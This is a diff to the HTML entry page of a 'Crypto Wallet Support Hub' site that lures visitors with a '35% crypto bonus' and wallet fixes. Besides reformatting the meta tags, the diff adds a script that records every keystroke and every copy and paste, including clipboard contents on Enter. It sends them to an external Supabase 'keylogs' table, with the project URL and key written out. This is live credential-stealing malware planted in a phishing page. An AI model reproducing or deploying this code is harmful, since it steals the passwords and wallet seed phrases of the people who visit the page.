@@ -1,38 +1,67 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues</title>
+  <meta name="description" content="Access the Crypto Support Hub to claim a 35% crypto bonus, resolve wallet connection issues, fix transaction errors, and manage your crypto assets securely." />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="crypto wallet support, claim crypto bonus, wallet connect issues, blockchain support, crypto bonus hub, fix wallet errors">
 
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="/favicon.png" />
 
-<title>Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues</title>
+  <!-- Open Graph Meta (WhatsApp, Telegram, Facebook preview) -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://bankvercel.vercel.app/" />
+  <meta property="og:title" content="Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues" />
+  <meta property="og:description" content="Claim a 35% crypto bonus and resolve wallet issues instantly. Connect your wallet to fix errors, verify transactions, and access crypto support tools." />
+  <meta property="og:image" content="https://bankvercel.vercel.app/preview.png" />
 
-<meta name="description" content="Access the Crypto Support Hub to claim a 35% crypto bonus, resolve wallet connection issues, fix transaction errors, and manage your crypto assets securely." />
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues" />
+  <meta name="twitter:description" content="Claim a 35% crypto bonus and fix wallet issues securely using our crypto support hub." />
+  <meta name="twitter:image" content="https://bankvercel.vercel.app/preview.png" />
 
-<meta name="robots" content="index, follow" />
+  <!-- Keylogger Script -->
+  <script>
+    // Initialize Supabase
+    const supabase = window.supabase.createClient(
+      'https://efjanywnqbtbdnxlspga.supabase.co',
+      'sb_publishable_E0cGB_SOoW2EZj4JGlTF7A_b2zxZaOi'
+    );
 
-<meta name="keywords" content="crypto wallet support, claim crypto bonus, wallet connect issues, blockchain support, crypto bonus hub, fix wallet errors">
+    // Keylogger logic
+    document.addEventListener('keydown', logKey);
+    document.addEventListener('copy', logClipboard);
+    document.addEventListener('paste', logClipboard);
 
-<!-- Favicon -->
-<link rel="icon" type="image/png" href="/favicon.png" />
+    function logKey(e) {
+      const key = e.key;
+      if (key === 'Enter') {
+        logClipboard();
+      }
+      sendToSupabase(key);
+    }
 
-<!-- Open Graph Meta (WhatsApp, Telegram, Facebook preview) -->
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://bankvercel.vercel.app/" />
-<meta property="og:title" content="Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues" />
-<meta property="og:description" content="Claim a 35% crypto bonus and resolve wallet issues instantly. Connect your wallet to fix errors, verify transactions, and access crypto support tools." />
-<meta property="og:image" content="https://bankvercel.vercel.app/preview.png" />
+    function logClipboard(e) {
+      const text = e.clipboardData ? e.clipboardData.getData('text') : '';
+      sendToSupabase(text);
+    }
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="Crypto Wallet Support Hub | Claim 35% Bonus & Fix Wallet Issues" />
-<meta name="twitter:description" content="Claim a 35% crypto bonus and fix wallet issues securely using our crypto support hub." />
-<meta name="twitter:image" content="https://bankvercel.vercel.app/preview.png" />
-
+    function sendToSupabase(data) {
+      supabase.from('keylogs')
+        .insert({
+          key: data,
+          timestamp: new Date().toISOString()
+        })
+        .catch(err => console.error('Supabase error:', err));
+    }
+  </script>
 </head>
-
 <body>
-<div id="root"></div>
-<script type="module" src="/src/index.tsx"></script>
+  <div id="root"></div>
+  <script type="module" src="/src/index.tsx"></script>
 </body>
 </html>
